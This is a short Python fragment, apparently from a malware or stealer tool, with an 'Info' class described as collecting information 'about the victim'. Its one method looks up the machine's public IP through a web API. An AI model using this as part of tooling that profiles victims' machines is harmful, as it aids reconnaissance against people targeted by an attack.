# Class that contains all ways to get informations about the victim 
from urllib.request import Request, urlopen

class Info():
    def __init__(self):
        pass
    
    def get_ip(self):
        ip = "None"
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        return ip
    
    